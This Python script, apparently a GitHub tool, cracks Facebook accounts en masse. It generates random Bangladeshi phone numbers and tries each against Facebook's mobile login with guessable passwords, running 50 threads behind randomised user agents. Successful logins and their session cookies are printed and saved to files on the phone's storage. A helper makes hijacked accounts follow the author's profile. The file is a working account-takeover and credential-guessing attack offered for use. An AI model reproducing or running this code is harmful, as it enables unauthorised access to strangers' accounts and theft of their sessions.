#-------------------------------------------------------------
#Don't Forget To Follow My Github &
#Sent Star This Repositories 🙂
#-------------------------------------------------------------
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#-----[Global Functions]-----#
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
#-----[Colours]-----#
RED = '\033[1;91m' #
WHITE = '\033[1;97m' #
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m' #
BLUE = '\033[1;34m' #
ORANGE = '\033[1;35m' #
P = '\x1b[1;97m' # 
M = '\x1b[1;91m' # 
H = '\x1b[1;92m' # 
K = '\x1b[1;92m' # 
B = '\x1b[1;94m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;96m' #
N = '\x1b[0m' #
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
mtd,cp_cpx,cokix=[],[],[]
ugen2=[]
ugen=[]
#-----[App Checker]-----#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
    else:
        print(f'\r[😍] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🥵] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
           
#-----[UserAgent]-----#
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
         
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.001)
#-----[Logo]-----#
logo=(""" 
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗                           ___   _   _ _____ _____ _   _ 
          
  /
 
 /$$$$$$$      /$$$$$$      /$$$$$$$      /$$   /$$
| $$__  $$    /$$__  $$    | $$__  $$    | $$  /$$/
| $$  \ $$   | $$  \ $$    | $$  \ $$    | $$ /$$/ 
| $$  | $$   | $$$$$$$$    | $$$$$$$/    | $$$$$/  
| $$  | $$   | $$__  $$    | $$__  $$    | $$  $$  
| $$  | $$   | $$  | $$    | $$  \ $$    | $$\  $$ 
| $$$$$$$//$$| $$  | $$ /$$| $$  | $$ /$$| $$ \  $$
|_______/|__/|__/  |__/|__/|__/  |__/|__/|__/  \__/
                                                                                                                                                                                                                                                                                                                                                          
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m        [ WORKING MOBILE DATA AND WIFI ALSO ]         \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[AUTHOR                   • \33[1;38mMd Forid ]\33[1;38m     ║\033[1;31m 
╠══[FACEBOOK                 • Md Forid ]   ║  \033[1;97m  
╠══[GITHUB                   • \33[1;38mMd-Fori-Dark ]   ║\33[1;34m   
╠══[REGIONAL                • BANGLADESH ]  ║\33[1;35m 
╠══[TOOLS                    • Free but approval Need]         ║ \33[1;32m   
╠══[VERSION                  • 0.2 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m
""")
try:
   print('\n\n\033[1;33mLOADING ASSET FILES ... \033[0;97m')
   v = 5.2
   update = ('5.2')
   update = ('5.2')
   if str(v) in update:
       os.system('clear')
   else:pass
except:print('\n\033[1;31mNO INTERNET CONNECTION ... \033[0;97m')

def linex():
        print('\033[1;37m ──────────────────────────────────────────')
 
def clear():
    os.system('clear')
    print(logo)
    
#-----[Loop Menu]-----#  
loop = 0
oks = []
cps = []

#-----[Main-Menu]-----#
def mumit_menu():
    os.system('clear');print(logo)
    print('\033[1;92m [1] RANDOM CRACK')
    print('\033[1;92m [0] EXIT TOOL')
    linex()
    mumit=input(' \033[1;32m[?] SELECT MENU: ')
    if mumit in['1','01']:DaRk()
    elif mumit in['0','00']:exit()
    else:exit()
    
def DaRk():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('\033[1;32m [√] BD CODE : 017/019/016/018/013')
    linex()
    code = input('\033[1;32m [?] CHOOSE : ')
    os.system('clear')
    print(logo)
    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
    linex()
    limit = int(input('\033[1;32m [?] CHOOSE : '))
    linex()
    xd_cp=input(f'\033[1;32m [?] You Want To Show Cp Account?[\033[1;32mY\033[1;34m/\033[1;31mN\033[1;32m]: ')
    if xd_cp in ['y','Y','yes','Yes','1']:cp_cpx.append('y')
    else:cp_cpx.append('n')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as ahare:
        clear()
        tl = str(len(user))
        print('\033[1;32m [+] Choice Code: '+code)
        print('\033[1;92m [+] Crack Process Has Started')
        print('\033[1;92m [!] Use Flight Mode For Speed Up')
        linex()
        for fuck in user:
            pwx = [fuck,'bangladesh']
            uid = code+fuck
            ahare.submit(mumitx,uid,pwx,tl)
    print('CRACK PROCESS HAS BEEN COMPLETED ')
    print('Ok Ids Saved in /DaRk-OK.txt')
    print('Cp Ids Saved in /DaRk-CP.txt')
    linex()
    
def mumitx(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb ={
    'authority': 'm.facebook.com',
     'method':'POST',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=9PMlZeQQAEOsC6sY5F1iJO3U; sb=9PMlZUDWJJIc6R8o7WQ2-O9j; m_pixel_ratio=1.25; x-referer=eyJyIjoiL2Vycm9yL2luZGV4LnBocD9lcnI9ZWMma2Vycj0xMzU3MDMyJmtlcnJfc3VtbWFyeT1Tb21ldGhpbmclMjB3ZW50JTIwd3Jvbmcma2Vycl9kZXNjcmlwdGlvbj1QbGVhc2UlMjB0cnklMjByZWZyZXNoaW5nJTIwdGhlJTIwUGFnZSUyMG9yJTIwY2xvc2luZyUyMGFuZCUyMHJlb3BlbmluZyUyMHlvdXIlMjBicm93c2VyJTIwd2luZG93LiIsImgiOiIvZXJyb3IvaW5kZXgucGhwP2Vycj1lYyZrZXJyPTEzNTcwMzIma2Vycl9zdW1tYXJ5PVNvbWV0aGluZyUyMHdlbnQlMjB3cm9uZyZrZXJyX2Rlc2NyaXB0aW9uPVBsZWFzZSUyMHRyeSUyMHJlZnJlc2hpbmclMjB0aGUlMjBQYWdlJTIwb3IlMjBjbG9zaW5nJTIwYW5kJTIwcmVvcGVuaW5nJTIweW91ciUyMGJyb3dzZXIlMjB3aW5kb3cuIiwicyI6Im0ifQ%3D%3D; locale=en_GB; wl_cbv=v2%3Bclient_version%3A2332%3Btimestamp%3A1696986160; vpd=v1%3B604x384x1.25; wd=384x604; fr=0mG4p0E0fd6aIJrik.AWXrcxXnbyxz_wvDExYW4BskRLQ.BlJfP0.IN.AAA.0.0.BlJfSL.AWX6GHfYKqU',
    'dpr': '1.25',
    'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=AffxfutEzyG9BLcFpAPrGCDOa_YmgcUgCnsLVIjtvQi0AJxkU0IGvXx1TVbe4iim6DFGHjScJq44DWqEx-hcOODxp36uEVLraEEGebPSbqm73A&smuh=8366&lh=Ac9W_OX9AoS8qi-cdZY&wtsid=rdr_0Z46EGND6ZbXc3X5v&_rdr',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"itel A511LP"',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[DaRk-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                print('\033[1;32m[COOKIE] = \033[1;37m'+coki+ '')
                cek_apk(session,coki)
                open('/sdcard/DaRk-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;30m[DaRk-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/DaRk-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mDaRk\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass

#-----[Run Menu]-----#
mumit_menu()